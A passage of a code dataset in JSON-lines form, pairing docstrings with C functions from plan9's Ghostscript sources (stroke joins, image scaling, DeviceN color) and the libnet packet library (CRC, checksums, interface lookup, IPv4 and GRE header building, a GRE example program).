the\n\t     * relative positions of the lines in user space.\n\t     * We repeat the computation described above,\n\t     * using the cdelta values instead of the widths.\n\t     * Because the definition of ccw above is inverted\n\t     * from the intuitive one (for historical reasons),\n\t     * we actually have to do the test backwards.\n\t     */\n\t    ccw0 = v1 * u2 < v2 * u1;\n#ifdef DEBUG\n\t    {\n\t\tdouble a1 = atan2(u1, v1), a2 = atan2(u2, v2), dif = a1 - a2;\n\n\t\tif (dif < 0)\n\t\t    dif += 2 * M_PI;\n\t\telse if (dif >= 2 * M_PI)\n\t\t    dif -= 2 * M_PI;\n\t\tif (dif != 0 && (dif < M_PI) != ccw0)\n\t\t    lprintf8(\"ccw wrong: tan(a1=%g)=%g/%g, tan(a2=%g)=%g,%g, dif=%g, ccw=%d\\n\",\n\t\t\t     a1, u1, v1, a2, u2, v2, dif, ccw);\n\t    }\n#endif\n\t}\n\tnum = u1 * v2 - u2 * v1;\n\tdenom = u1 * u2 + v1 * v2;\n\t/*\n\t * We will want either tan(a-b) or tan(b-a)\n\t * depending on the orientations of the lines.\n\t * Fortunately we know the relative orientations already.\n\t */\n\tif (!ccw0)\t\t/* have plp - nplp, want vice versa */\n\t    num = -num;\n#ifdef DEBUG\n\tif (gs_debug_c('O')) {\n\t    dlprintf4(\"[o]Miter check: u1/v1=%f/%f, u2/v2=%f/%f,\\n\",\n\t\t      u1, v1, u2, v2);\n\t    dlprintf3(\"        num=%f, denom=%f, check=%f\\n\",\n\t\t      num, denom, check);\n\t}\n#endif\n\t/*\n\t * If we define T = num / denom, then we want to use\n\t * a miter join iff arctan(T) >= arctan(check).\n\t * We know that both of these angles are in the 1st\n\t * or 2nd quadrant, and since arctan is monotonic\n\t * within each quadrant, we can do the comparisons\n\t * on T and check directly, taking signs into account\n\t * as follows:\n\t *              sign(T) sign(check)     atan(T) >= atan(check)\n\t *              ------- -----------     ----------------------\n\t *              +       +               T >= check\n\t *              -       +               true\n\t *              +       -               false\n\t *              -       -               T >= check\n\t */\n\tif (denom < 0)\n\t    num = -num, denom = -denom;\n\t/* Now denom >= 0, so sign(num) = sign(T). */\n\tif (check > 0 ?\n\t    (num < 0 || num >= denom * check) :\n\t    (num < 0 && num >= denom * check)\n\t    ) {\n\t    /* OK to use a miter join. */\n\t    gs_fixed_point mpt;\n\n\t    if_debug0('O', \"\t... passes.\\n\");\n\t    /* Compute the intersection of */\n\t    /* the extended edge lines. */\n\t    if (line_intersect(outp, &plp->e.cdelta, np,\n\t\t\t       &nplp->o.cdelta, &mpt) == 0\n\t\t)\n\t\tASSIGN_POINT(outp, mpt);\n\t}\n    }\n    return 4;\n}", "path": "plan9/sys/src/cmd/gs/src/gxstroke.c", "commit_date": "2014-02-09 00:00:00", "repo_name": "brho/plan9", "stars": 667, "license": "other", "language": "c", "size": 52242}
{"docstring": "/* Add lines with a possible initial moveto. */\n", "func_signal": "private int\nadd_points(gx_path * ppath, const gs_fixed_point * points, int npoints,\n\t   bool moveto_first)", "code": "{\n    int code;\n\n    vd_setcolor(0);\n    vd_setlinewidth(0);\n    if (moveto_first) {\n\tcode = gx_path_add_point(ppath, points[0].x, points[0].y);\n\tvd_moveto(points[0].x, points[0].y);\n\tif (code < 0)\n\t    return code;\n\tvd_lineto_multi(points + 1, npoints - 1);\n\treturn gx_path_add_lines(ppath, points + 1, npoints - 1);\n    } else {\n\tvd_lineto_multi(points, npoints);\n\treturn gx_path_add_lines(ppath, points, npoints);\n    }\n}", "path": "plan9/sys/src/cmd/gs/src/gxstroke.c", "commit_date": "2014-02-09 00:00:00", "repo_name": "brho/plan9", "stars": 667, "license": "other", "language": "c", "size": 52242}
{"docstring": "/* Process a buffer.  Note that this handles Encode and Decode identically. */\n", "func_signal": "private int\ns_IScale_process(stream_state * st, stream_cursor_read * pr,\n\t\t stream_cursor_write * pw, bool last)", "code": "{\n    stream_IScale_state *const ss = (stream_IScale_state *) st;\n\n    /* Check whether we need to deliver any output. */\n\n  top:while (ss->src_y > ss->dst_last_index) {\t/* We have enough horizontally scaled temporary rows */\n\t/* to generate a vertically scaled output row. */\n\tuint wleft = pw->limit - pw->ptr;\n\n\tif (ss->dst_y == ss->params.HeightOut)\n\t    return EOFC;\n\tif (wleft == 0)\n\t    return 1;\n\tif (ss->dst_offset == 0) {\n\t    byte *row;\n\n\t    if (wleft >= ss->dst_size) {\t/* We can scale the row directly into the output. */\n\t\trow = pw->ptr + 1;\n\t\tpw->ptr += ss->dst_size;\n\t    } else {\t\t/* We'll have to buffer the row. */\n\t\trow = ss->dst;\n\t    }\n\t    /* Apply filter to zoom vertically from tmp to dst. */\n\t    zoom_y(row, ss->sizeofPixelOut, ss->params.MaxValueOut, ss->tmp,\n\t\t   ss->params.WidthOut, ss->tmp_width, ss->params.Colors,\n\t\t   &ss->dst_next_list, ss->dst_items);\n\t    /* Idiotic C coercion rules allow T* and void* to be */\n\t    /* inter-assigned freely, but not compared! */\n\t    if ((void *)row != ss->dst)\t\t/* no buffering */\n\t\tgoto adv;\n\t} {\t\t\t/* We're delivering a buffered output row. */\n\t    uint wcount = ss->dst_size - ss->dst_offset;\n\t    uint ncopy = min(wleft, wcount);\n\n\t    memcpy(pw->ptr + 1, (byte *) ss->dst + ss->dst_offset, ncopy);\n\t    pw->ptr += ncopy;\n\t    ss->dst_offset += ncopy;\n\t    if (ncopy != wcount)\n\t\treturn 1;\n\t    ss->dst_offset = 0;\n\t}\n\t/* Advance to the next output row. */\n      adv:++(ss->dst_y);\n\tif (ss->dst_y != ss->params.HeightOut)\n\t    calculate_dst_contrib(ss, ss->dst_y);\n    }\n\n    /* Read input data and scale horizontally into tmp. */\n\n    {\n\tuint rleft = pr->limit - pr->ptr;\n\tuint rcount = ss->src_size - ss->src_offset;\n\n\tif (rleft == 0)\n\t    return 0;\t\t/* need more input */\n#ifdef DEBUG\n\tassert(ss->src_y < ss->params.HeightIn);\n#endif\n\tif (rleft >= rcount) {\t/* We're going to fill up a row. */\n\t    const byte *row;\n\n\t    if (ss->src_offset == 0) {\t/* We have a complete row.  Read the data */\n\t\t/* directly from the input. */\n\t\trow = pr->ptr + 1;\n\t    } else {\t\t/* We're buffering a row in src. */\n\t\trow = ss->src;\n\t\tmemcpy((byte *) ss->src + ss->src_offset, pr->ptr + 1,\n\t\t       rcount);\n\t\tss->src_offset = 0;\n\t    }\n\t    /* Apply filter to zoom horizontally from src to tmp. */\n\t    if_debug2('w', \"[w]zoom_x y = %d to tmp row %d\\n\",\n\t\t      ss->src_y, (ss->src_y % MAX_ISCALE_SUPPORT));\n\t    zoom_x(ss->tmp + (ss->src_y % MAX_ISCALE_SUPPORT) *\n\t\t   ss->tmp_width * ss->params.Colors, row,\n\t\t   ss->sizeofPixelIn, ss->tmp_width, ss->params.WidthIn,\n\t\t   ss->params.Colors, ss->contrib, ss->items);\n\t    pr->ptr += rcount;\n\t    ++(ss->src_y);\n\t    goto top;\n\t} else {\t\t/* We don't have a complete row.  Copy data to src buffer. */\n\t    memcpy((byte *) ss->src + ss->src_offset, pr->ptr + 1, rleft);\n\t    ss->src_offset += rleft;\n\t    pr->ptr += rleft;\n\t    return 0;\n\t}\n    }\n}", "path": "plan9/sys/src/cmd/gs/src/siscale.c", "commit_date": "2014-02-09 00:00:00", "repo_name": "brho/plan9", "stars": 667, "license": "other", "language": "c", "size": 52242}
{"docstring": "/* Add a round cap to a path. */\n/* Assume the current point is the cap origin (endp->co). */\n", "func_signal": "private int\nadd_round_cap(gx_path * ppath, const_ep_ptr endp)", "code": "{\n    int code;\n\n    /*\n     * Per the Red Book, we draw a full circle, even though a semicircle\n     * is sufficient for the join.\n     */\n    if ((code = gx_path_add_partial_arc(ppath, px + cdx, py + cdy,\n\t\t\t\t\txo + cdx, yo + cdy,\n\t\t\t\t\tquarter_arc_fraction)) < 0 ||\n\t(code = gx_path_add_partial_arc(ppath, xe, ye, xe + cdx, ye + cdy,\n\t\t\t\t\tquarter_arc_fraction)) < 0 ||\n\t(code = gx_path_add_partial_arc(ppath, px - cdx, py - cdy,\n\t\t\t\t\txe - cdx, ye - cdy,\n\t\t\t\t\tquarter_arc_fraction)) < 0 ||\n\t(code = gx_path_add_partial_arc(ppath, xo, yo, xo - cdx, yo - cdy,\n\t\t\t\t\tquarter_arc_fraction)) < 0 ||\n\t/* The final point must be (xe,ye). */\n\t(code = gx_path_add_line(ppath, xe, ye)) < 0\n\t)\n\treturn code;\n    vd_lineto(xe, ye);\n    return 0;\n}", "path": "plan9/sys/src/cmd/gs/src/gxstroke.c", "commit_date": "2014-02-09 00:00:00", "repo_name": "brho/plan9", "stars": 667, "license": "other", "language": "c", "size": 52242}
{"docstring": "/* <array> .setdevicenspace - */\n/* The current color space is the alternate space for the DeviceN space. */\n", "func_signal": "private int\nzsetdevicenspace(i_ctx_t *i_ctx_p)", "code": "{\n    os_ptr op = osp;\n    const ref *pcsa;\n    gs_separation_name *names;\n    gs_device_n_map *pmap;\n    uint num_components;\n    gs_color_space cs;\n    const gs_color_space * pacs;\n    ref_colorspace cspace_old;\n    gs_function_t *pfn;\n    int code;\n\n    /* Verify that we have an array as our input parameter */\n    check_read_type(*op, t_array);\n    if (r_size(op) != 4)\n\treturn_error(e_rangecheck);\n\n    /* pcsa is a pointer to the color names array (element 1 in input array) */\n    pcsa = op->value.const_refs + 1;\n    if (!r_is_array(pcsa))\n\treturn_error(e_typecheck);\n    num_components = r_size(pcsa);\n    if (num_components == 0)\n\treturn_error(e_rangecheck);\n    if (num_components > GS_CLIENT_COLOR_MAX_COMPONENTS)\n\treturn_error(e_limitcheck);\n\n    /* Check tint transform procedure.  Note: Cheap trick to get pointer to it.\n       The tint transform procedure is element 3 in the input array */\n    check_proc(pcsa[2]);\n    \n    /* The alternate color space has been selected as the current color space */\n    pacs = gs_currentcolorspace(igs);\n    cs = *pacs;\n    /* See zcsindex.c for why we use memmove here. */\n    memmove(&cs.params.device_n.alt_space, &cs,\n\t    sizeof(cs.params.device_n.alt_space));\n    gs_cspace_init(&cs, &gs_color_space_type_DeviceN, imemory, false);\n    code = gs_build_DeviceN(&cs, num_components, pacs, imemory);\n    if (code < 0)\n\treturn code;\n    names = cs.params.device_n.names;\n    pmap = cs.params.device_n.map;\n    cs.params.device_n.get_colorname_string = gs_get_colorname_string;\n\n    /* Pick up the names of the components */\n    {\n\tuint i;\n\tref sname;\n\n\tfor (i = 0; i < num_components; ++i) {\n\t    array_get(imemory, pcsa, (long)i, &sname);\n\t    switch (r_type(&sname)) {\n\t\tcase t_string:\n\t\t    code = name_from_string(imemory, &sname, &sname);\n\t\t    if (code < 0) {\n\t\t\tifree_object(names, \".setdevicenspace(names)\");\n\t\t\tifree_object(pmap, \".setdevicenspace(map)\");\n\t\t\treturn code;\n\t\t    }\n\t\t    /* falls through */\n\t\tcase t_name:\n\t\t    names[i] = name_index(imemory, &sname);\n\t\t    break;\n\t\tdefault:\n\t\t    ifree_object(names, \".setdevicenspace(names)\");\n\t\t    ifree_object(pmap, \".setdevicenspace(map)\");\n\t\t    return_error(e_typecheck);\n\t    }\n\t}\n    }\n\n    /* Now set the current color space as DeviceN */\n\n    cspace_old = istate->colorspace;\n    /*\n     * pcsa is a pointer to element 1 (2nd element)  in the DeviceN\n     * description array.  Thus pcsa[2] is element #3 (4th element)\n     * which is the tint transform.\n     */\n    istate->colorspace.procs.special.device_n.layer_names = pcsa[0];\n    istate->colorspace.procs.special.device_n.tint_transform = pcsa[2];    \n    pfn = ref_function(pcsa + 2);\t/* See comment above */\n    if (!pfn)\n\tcode = gs_note_error(e_rangecheck);\n\n    if (code < 0) {\n\tistate->colorspace = cspace_old;\n\tifree_object(names, \".setdevicenspace(names)\");\n\tifree_object(pmap, \".setdevicenspace(map)\");\n\treturn code;\n    }\n    gs_cspace_set_devn_function(&cs, pfn);\n    code = gs_setcolorspace(igs, &cs);\n    if (code < 0) {\n\tistate->colorspace = cspace_old;\n\treturn code;\n    }\n    rc_decrement(pmap, \".setdevicenspace(map)\");  /* build sets rc = 1 */\n    pop(1);\n    return 0;\n}", "path": "plan9/sys/src/cmd/gs/src/zcsdevn.c", "commit_date": "2014-02-09 00:00:00", "repo_name": "brho/plan9", "stars": 667, "license": "other", "language": "c", "size": 52242}
{"docstring": "/*\n *  Compute the CRC of the contents of a buffer\n *\n *  CRC generator G(x) is the sum of x^n for\n *      n = 32, 26, 23, 22, 16, 12, 11, 10, 8, 7, 5, 4, 2, 1, 0\n */\n", "func_signal": "uint32_t\nlibnet_compute_crc(uint8_t *buf, uint32_t len)", "code": "{\n    uint32_t val;\n\n    val = ~0;\n    while (len--)\n    {\n        val = crc_table[(val ^ *buf) & 0xff] ^ (val >> 0x08);\n        buf++;\n    }\n    return (~val);\n}", "path": "libnet/src/libnet_crc.c", "commit_date": "2019-10-08 00:00:00", "repo_name": "libnet/libnet", "stars": 863, "license": "bsd-2-clause", "language": "c", "size": 5431}
{"docstring": "/*\n *  Determine ppa number that specifies ifname\n */\n", "func_signal": "static int\nget_dlpi_ppa(register int fd, register const int8_t *ifname, register int unit,\n    register int8_t *ebuf)", "code": "{\n    register const int8_t *cp;\n    register int kd;\n    void *addr;\n    struct ifnet ifnet;\n    int8_t if_name[sizeof(ifnet.if_name)], tifname[32];\n\n    cp = strrchr(ifname, '/');\n    if (cp != NULL)\n    {\n        ifname = cp + 1;\n    }\n    if (nlist(path_vmunix, &nl) < 0)\n    {\n        snprintf(ebuf, LIBNET_ERRBUF_SIZE,\n                 \"nlist %s failed\", path_vmunix);\n        return (-1);\n    }\n\n    if (nl[NL_IFNET].n_value == 0)\n    {\n        snprintf(ebuf, LIBNET_ERRBUF_SIZE,\n                 \"could't find %s kernel symbol\", nl[NL_IFNET].n_name);\n        return (-1);\n    }\n\n    kd = open(\"/dev/kmem\", O_RDONLY);\n    if (kd < 0)\n    {\n        snprintf(ebuf, LIBNET_ERRBUF_SIZE,\n                 \"kmem open: %s\", strerror(errno));\n        return (-1);\n    }\n\n    if (dlpi_kread(kd, nl[NL_IFNET].n_value, &addr, sizeof(addr), ebuf) < 0)\n    {\n        close(kd);\n        return (-1);\n    }\n    for (; addr != NULL; addr = ifnet.if_next)\n    {\n        if (dlpi_kread(kd, (off_t)addr, &ifnet, sizeof(ifnet), ebuf) < 0 ||\n            dlpi_kread(kd, (off_t)ifnet.if_name,\n            if_name, sizeof(if_name), ebuf) < 0)\n            {\n                close(kd);\n                return (-1);\n            }\n            snprintf(tifname, sizeof(tifname), \"%.*s%d\",\n                (int)sizeof(if_name), if_name, ifnet.if_unit);\n            if (strcmp(tifname, ifname) == 0)\n            {\n                return (ifnet.if_index);\n            }\n    }\n\n    snprintf(ebuf, LIBNET_ERRBUF_SIZE,\n             \"Can't find %s\", ifname);\n    return (-1);\n}", "path": "libnet/src/libnet_link_dlpi.c", "commit_date": "2019-10-20 00:00:00", "repo_name": "libnet/libnet", "stars": 863, "license": "bsd-2-clause", "language": "c", "size": 5431}
{"docstring": "/* __OpenBSD__ */\n", "func_signal": "int\nlibnet_select_device(libnet_t *l)", "code": "{\n    int c, i;\n    struct libnet_ifaddr_list *address_list, *al;\n    uint32_t addr;\n\n\n    if (l == NULL)\n    { \n        return (-1);\n    }\n\n    if (l->device && !isdigit(l->device[0]))\n    {\n#if !(__WIN32__)\n\tif (libnet_check_iface(l) < 0)\n\t{\n            /* err msg set in libnet_check_iface() */\n\t    return (-1);\n\t}\n#endif\n\treturn (1);\n    }\n\n    /*\n     *  Number of interfaces.\n     */\n    c = libnet_ifaddrlist(&address_list, l->device, l->err_buf);\n    if (c < 0)\n    {\n        return (-1);\n    }\n    else if (c == 0)\n    {\n        snprintf(l->err_buf, LIBNET_ERRBUF_SIZE,\n                \"%s(): no network interface found\", __func__);\n        return (-1);\n    }\n\t\n    al = address_list;\n    if (l->device)\n    {\n        addr = libnet_name2addr4(l, l->device, LIBNET_DONT_RESOLVE);\n\n        for (i = c; i; --i, ++address_list)\n        {\n            if (\n                    0 == strcmp(l->device, address_list->device)\n                    || \n                    address_list->addr == addr\n               )\n            {\n                /* free the \"user supplied device\" - see libnet_init() */\n                free(l->device);\n                l->device =  strdup(address_list->device);\n                goto good;\n            }\n        }\n        if (i <= 0)\n        {\n            snprintf(l->err_buf, LIBNET_ERRBUF_SIZE,\n                    \"%s(): can't find interface for IP %s\", __func__,\n                    l->device);\n\t    goto bad;\n        }\n    }\n    else\n    {\n        l->device = strdup(address_list->device);\n    }\n\ngood:\n    for (i = 0; i < c; i++)\n    {\n        free(al[i].device);\n        al[i].device = NULL;\n    }\n    return (1);\n\nbad:\n    for (i = 0; i < c; i++)\n    {\n        free(al[i].device);\n        al[i].device = NULL;\n    }\n    return (-1);\n}", "path": "libnet/src/libnet_if_addr.c", "commit_date": "2019-10-21 00:00:00", "repo_name": "libnet/libnet", "stars": 863, "license": "bsd-2-clause", "language": "c", "size": 5431}
{"docstring": "/* Split device into device type and unit number.\n * Return >0 on success. */\n", "func_signal": "static int\ndlpi_unit(const char *dev, int *namelen, int *unit)", "code": "{\n    char *p;\n    char *eos;\n    if (!*dev) {\n        return 0;\n    }\n    p = find_last_not_of(dev, \"0123456789\");\n    if (!p) {\n        return 0;\n    }\n    p++;\n    if (!*p) {\n        return 0;\n    }\n    *unit = strtol(p, NULL, 10);\n    *namelen = p - dev;\n    return 1;\n}", "path": "libnet/src/libnet_link_dlpi.c", "commit_date": "2019-10-20 00:00:00", "repo_name": "libnet/libnet", "stars": 863, "license": "bsd-2-clause", "language": "c", "size": 5431}
{"docstring": "/* Note: len is in bytes, not 16-bit words! */\n", "func_signal": "int\nlibnet_in_cksum(uint16_t *addr, int len)", "code": "{\n    int sum = 0;\n    union\n    {\n        uint16_t s;\n        uint8_t b[2];\n    } pad;\n\n    sum = 0;\n\n    while (len > 1)\n    {\n        sum += *addr++;\n        len -= 2;\n    }\n\n    if (len == 1)\n    {\n        pad.b[0] = *(uint8_t *)addr;\n        pad.b[1] = 0;\n        sum += pad.s;\n    }\n\n    return (sum);\n}", "path": "libnet/src/libnet_checksum.c", "commit_date": "2019-10-09 00:00:00", "repo_name": "libnet/libnet", "stars": 863, "license": "bsd-2-clause", "language": "c", "size": 5431}
{"docstring": "/* TODO len - should be calculated if -1 */\n", "func_signal": "libnet_ptag_t\nlibnet_build_ipv4(uint16_t ip_len, uint8_t tos, uint16_t id, uint16_t frag,\nuint8_t ttl, uint8_t prot, uint16_t sum, uint32_t src, uint32_t dst,\nconst uint8_t *payload, uint32_t payload_s, libnet_t *l, libnet_ptag_t ptag)", "code": "{\n    uint32_t n = LIBNET_IPV4_H; /* size of memory block */\n    libnet_pblock_t *p, *p_data, *p_temp;\n    struct libnet_ipv4_hdr ip_hdr;\n    libnet_ptag_t ptag_data = 0; /* used if there is ipv4 payload */\n    libnet_ptag_t ptag_hold;\n\n    if (l == NULL)\n    { \n        return (-1);\n    } \n\n    /*\n     *  Find the existing protocol block if a ptag is specified, or create\n     *  a new one.\n     */\n    p = libnet_pblock_probe(l, ptag, n, LIBNET_PBLOCK_IPV4_H);\n    if (p == NULL)\n    {\n        return (-1);\n    }\n\n    memset(&ip_hdr, 0, sizeof(ip_hdr));\n    ip_hdr.ip_v          = 4;      /* version 4 */\n    ip_hdr.ip_hl         = 5;      /* 20 byte header,  measured in 32-bit words */\n\n    /* check to see if there are IP options to include */\n    if (p->prev)\n    {\n        if (p->prev->type == LIBNET_PBLOCK_IPO_H)\n        {\n            /* IPO block's length must be multiple of 4, or it's incorrectly\n             * padded, in which case there is no \"correct\" IP header length,\n             * it will too short or too long, we choose too short.\n             */\n            ip_hdr.ip_hl += p->prev->b_len / 4;\n        }\n    }\n    /* Note that p->h_len is not adjusted. This seems a bug, but it is because\n     * it is not used!  libnet_do_checksum() is passed the h_len (as `len'),\n     * but for IPPROTO_IP it is ignored in favor of the ip_hl.\n     */\n\n    ip_hdr.ip_tos        = tos;                       /* IP tos */\n    ip_hdr.ip_len        = htons(ip_len);             /* total length */\n    ip_hdr.ip_id         = htons(id);                 /* IP ID */\n    ip_hdr.ip_off        = htons(frag);               /* fragmentation flags */\n    ip_hdr.ip_ttl        = ttl;                       /* time to live */\n    ip_hdr.ip_p          = prot;                      /* transport protocol */\n    ip_hdr.ip_sum        = (sum ? htons(sum) : 0);    /* checksum */\n    ip_hdr.ip_src.s_addr = src;                       /* source ip */\n    ip_hdr.ip_dst.s_addr = dst;                       /* destination ip */\n    \n    if (libnet_pblock_append(l, p, (uint8_t *)&ip_hdr, LIBNET_IPV4_H) == -1)\n    {\n        goto bad;\n    }\n\n    /* save the original ptag value */\n    ptag_hold = ptag;\n\n    if (ptag == LIBNET_PTAG_INITIALIZER)\n    {\n        ptag = libnet_pblock_update(l, p, LIBNET_IPV4_H, LIBNET_PBLOCK_IPV4_H);\n    }\n\n    /* find and set the appropriate ptag, or else use the default of 0 */\n    /* When updating the ipv4 block, we need to find the data block, and\n     * adjust our ip_offset if the new payload size is different from what\n     * it used to be.\n     */\n    if (ptag_hold && p->prev)\n    {\n        p_temp = p->prev;\n        while (p_temp->prev &&\n              (p_temp->type != LIBNET_PBLOCK_IPDATA) &&\n              (p_temp->type != LIBNET_PBLOCK_IPV4_H))\n        {\n            p_temp = p_temp->prev;\n        }\n\n        if (p_temp->type == LIBNET_PBLOCK_IPDATA)\n        {\n            ptag_data = p_temp->ptag;\n        }\n        else\n        {\n             snprintf(l->err_buf, LIBNET_ERRBUF_SIZE,\n                     \"%s(): IPv4 data pblock not found\", __func__);\n        }\n    }\n\n    if (payload_s && !payload)\n    {\n         snprintf(l->err_buf, LIBNET_ERRBUF_SIZE,\n                 \"%s(): payload inconsistency\", __func__);\n        goto bad;\n    }\n\n    if (payload_s)\n    {\n        /* update ptag_data with the new payload */\n        /* on create:\n         *    b_len = payload_s\n         *    l->total_size += b_len\n         *    h_len = 0\n         * on update:\n         *    b_len = payload_s\n         *    h_len += <diff in size between new b_len and old b_len>\n         *      increments if if b_len goes up, down if it goes down\n         * in either case:\n         *    copied = 0\n\t */\n        p_data = libnet_pblock_probe(l, ptag_data, payload_s,\n                LIBNET_PBLOCK_IPDATA);\n        if (p_data == NULL)\n        {\n            return (-1);\n        }\n\n        if (libnet_pblock_append(l, p_data, payload, payload_s) == -1)\n        {\n            goto bad;\n        }\n\n        if (ptag_data == LIBNET_PTAG_INITIALIZER)\n        {\n            /* IPDATA's h_len gets set to payload_s in both branches */\n            if (p_data->prev->type == LIBNET_PBLOCK_IPV4_H)\n            {\n                libnet_pblock_update(l, p_data, payload_s,\n                        LIBNET_PBLOCK_IPDATA);\n                /* swap pblocks to correct the protocol order */\n                libnet_pblock_swap(l, p->ptag, p_data->ptag); \n            }\n            else\n            {\n                /* SR - I'm not sure how to reach this code. Maybe if the first\n                 * time we added an ipv4 block, there was no payload, but when\n                 * we modify the block the next time, we have payload?\n\t\t */\n\n                /* update without setting this as the final pblock */\n                p_data->type  =  LIBNET_PBLOCK_IPDATA;\n                p_data->ptag  =  ++(l->ptag_state);\n                p_data->h_len =  payload_s; /* TODO dead code, data blocks don't have headers */\n\n                /* data was added after the initial construction */\n                for (p_temp = l->protocol_blocks;\n                        p_temp->type == LIBNET_PBLOCK_IPV4_H ||\n                        p_temp->type == LIBNET_PBLOCK_IPO_H;\n                        p_temp = p_temp->next)\n                {\n                    libnet_pblock_insert_before(l, p_temp->ptag, p_data->ptag);\n                    break;\n                }\n\n                /* the end block needs to have its next pointer cleared */\n                l->pblock_end->next = NULL;\n            }\n\n            if (p_data->prev && p_data->prev->type == LIBNET_PBLOCK_IPO_H)\n            {\n                libnet_pblock_swap(l, p_data->prev->ptag, p_data->ptag); \n            }\n        }\n    }\n    else\n    {\n        p_data = libnet_pblock_find(l, ptag_data);\n        if (p_data) \n        {\n            libnet_pblock_delete(l, p_data);\n        }\n        else\n        {\n            /* \n             * XXX - When this completes successfully, libnet errbuf contains \n             * an error message so to come correct, we'll clear it.\n             */ \n            memset(l->err_buf, 0, sizeof (l->err_buf));\n        }\n    }\n    if (sum == 0)\n    {\n        /*\n         *  If checksum is zero, by default libnet will compute a checksum\n         *  for the user.  The programmer can override this by calling\n         *  libnet_toggle_checksum(l, ptag, 1);\n         */\n        libnet_pblock_setflags(p, LIBNET_PBLOCK_DO_CHECKSUM);\n    }\n\n    return (ptag);\nbad:\n    libnet_pblock_delete(l, p);\n    return (-1);\n}", "path": "libnet/src/libnet_build_ip.c", "commit_date": "2019-10-22 00:00:00", "repo_name": "libnet/libnet", "stars": 863, "license": "bsd-2-clause", "language": "c", "size": 5431}
{"docstring": "/* FIXME: what is the portability of the \"((struct libnet_gre_hdr*)0)->\" ? */\n", "func_signal": "uint32_t\nlibnet_getgre_length(uint16_t fv)", "code": "{\n\n    uint32_t n = LIBNET_GRE_H;\n    /*\n     * If either the Checksum Present bit or the Routing Present bit are\n     * set, BOTH the Checksum and Offset fields are present in the GRE\n     * packet.\n     */\n\n    if ((!(fv & GRE_VERSION_MASK) && (fv & (GRE_CSUM|GRE_ROUTING))) || /* v0 */\n\t(fv & GRE_VERSION_MASK) )                                      /* v1 */\n    {\n\tn += sizeof( ((struct libnet_gre_hdr *)0)->gre_sum) + \n\t    sizeof( ((struct libnet_gre_hdr *)0)->gre_offset);\n    }\n\n    if ((!(fv & GRE_VERSION_MASK) && (fv & GRE_KEY)) ||                /* v0 */\n\t( (fv & GRE_VERSION_MASK) && (fv & GRE_SEQ)) )                 /* v1 */\n    {\n\tn += sizeof( ((struct libnet_gre_hdr *)0)->gre_key);\n    }\n\n    if ((!(fv & GRE_VERSION_MASK) && (fv & GRE_SEQ)) ||                /* v0 */\n\t( (fv & GRE_VERSION_MASK) && (fv & GRE_ACK)) )                 /* v1 */\n    {\n\tn += sizeof( ((struct libnet_gre_hdr *)0)->gre_seq );\n    }\n\n    return (n);\n}", "path": "libnet/src/libnet_build_gre.c", "commit_date": "2019-10-22 00:00:00", "repo_name": "libnet/libnet", "stars": 863, "license": "bsd-2-clause", "language": "c", "size": 5431}
{"docstring": "/* Return a pointer to the last character in 'in' that is not in 's',\n * or NULL if no such character exists. */\n", "func_signal": "static char *find_last_not_of(char *in, const char *s)", "code": "{\n  char* cur;\n  cur = in + strlen(in);\n  for(; cur != in; cur--) {\n    if (!strchr(s, *cur)) {\n      break;\n    }\n  }\n  return cur == in ? NULL : cur;\n}", "path": "libnet/src/libnet_link_dlpi.c", "commit_date": "2019-10-20 00:00:00", "repo_name": "libnet/libnet", "stars": 863, "license": "bsd-2-clause", "language": "c", "size": 5431}
{"docstring": "/*\n *                ---------------------------------\n *                |       Delivery Header         |\n *                ---------------------------------\n *                |       GRE Header              |\n *               ---------------------------------\n *                |       Payload packet          |\n *                ---------------------------------\n */\n", "func_signal": "int\nmain(int argc, char *argv[])", "code": "{\n    char c;\n    libnet_t *l;\n    char errbuf[LIBNET_ERRBUF_SIZE];\n    u_long src_ip = 0, dst_ip = 0, gre_src_ip = 0, gre_dst_ip = 0;\n    u_short checksum = 0, offset = 0;\n    u_char *routing = NULL;\n    u_long key = 0, seq = 0;\n    u_short gre_flags = 0;\n    u_long len;\n    u_long size = 0;\n    libnet_ptag_t t;\n\n    printf(\"libnet 1.1 packet shaping: GRE [link]\\n\");\n    \n    /*\n     *  Initialize the library.  Root priviledges are required.\n     */\n    l = libnet_init(\n            LIBNET_LINK,                            /* injection type */\n            NULL,                                   /* network interface */\n            errbuf);                                /* error buffer */\n  \n    if (!l)\n    {\n        fprintf(stderr, \"libnet_init: %s\", errbuf);\n        exit(EXIT_FAILURE);\n    }\n\n    /*\n     * parse options\n     */\n    while ((c = getopt(argc, argv, \"d:s:D:S:c:r:k:n:va:\")) != EOF)\n    {\n        switch (c)\n        {\n\t    \n            case 'd':\n                if ((dst_ip = libnet_name2addr4(l, optarg, LIBNET_RESOLVE)) == -1)\n                {\n                    fprintf(stderr, \"Bad destination IP address: %s\\n\", optarg);\n                    exit(EXIT_FAILURE);\n                }\n                break;\n            case 's':\n                if ((src_ip = libnet_name2addr4(l, optarg, LIBNET_RESOLVE)) == -1)\n                {\n                    fprintf(stderr, \"Bad source IP address: %s\\n\", optarg);\n                    exit(EXIT_FAILURE);\n                }\n                break;\n            case 'D':\n                if ((gre_dst_ip = libnet_name2addr4(l, optarg, LIBNET_RESOLVE)) == -1)\n                {\n                    fprintf(stderr, \"Bad destination IP address (GRE): %s\\n\", optarg);\n                    exit(EXIT_FAILURE);\n                }\n                break;\n            case 'S':\n                if ((gre_src_ip = libnet_name2addr4(l, optarg, LIBNET_RESOLVE)) == -1)\n                {\n                    fprintf(stderr, \"Bad source IP address (GRE): %s\\n\", optarg);\n                    exit(EXIT_FAILURE);\n                }\n                break;\n\t    case 'c':\n\t\tchecksum = atoi(optarg);\n\t\tgre_flags|=GRE_CSUM;\n                break;\n\t    case 'r':\n\t\trouting = (u_char *)optarg;\n\t\tgre_flags|=GRE_ROUTING;\n                break;\n\t    case 'k':\n\t\tkey = atoi(optarg);\n\t\tgre_flags|=GRE_KEY;\n                break;\n\t    case 'n':\n\t\tseq = atoi(optarg);\n\t\tgre_flags|=GRE_SEQ;\n                break;\n\t    case 'v':\n\t\tgre_flags|=(GRE_VERSION_1|GRE_KEY);\n\t\tbreak;\n\t    case 'a':\n\t\tif (! (gre_flags & GRE_VERSION_1))\n\t\t    usage(argv[0]);\n\t\tseq = atoi(optarg);    /* seq in v0 is ack in v1 */\n\t\tgre_flags|=GRE_ACK;\n\t\tbreak;\n            default:\n                exit(EXIT_FAILURE);\n        }\n    }\n\n    /*\n     * check options \n     */\n    if (!dst_ip)\n    {\n\tusage(argv[0]);\n    }\n\n    if (!src_ip)\n    {\n\tsrc_ip = libnet_get_ipaddr4(l);\n    }\n\n    if (!gre_dst_ip)\n    